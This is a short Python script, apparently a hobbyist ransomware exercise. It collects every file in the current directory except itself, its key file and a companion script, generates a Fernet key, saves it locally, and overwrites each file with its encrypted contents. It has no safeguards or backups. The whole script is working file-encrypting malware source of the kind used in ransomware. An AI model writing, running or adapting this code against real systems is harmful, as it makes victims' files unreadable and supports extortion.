#!/usr/bin/env python3


#____________________Encryption_______________________
import os
from cryptography.fernet import Fernet

#About Fernet....??


#Let's find Some files or All of the file as you say so!

files = []

for file in os.listdir():
  if file == "noob.py" or file =="thekey.key" or file == "prof.py":
    continue
  if os.path.isfile(file):
    files.append(file)
  
print(files)

#time for some craziest encryption

#key
key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
  thekey.write(key)

#file-encryption(Open>Encpt>Write the File)
for file in files:
  #open
  with open(file,"rb") as thefile:
    contents = thefile.read()

  #encrypt
  contents_encrypted = Fernet(key).encrypt(contents)

  #write
  with open(file,"wb") as thefile:
    thefile.write(contents_encrypted)
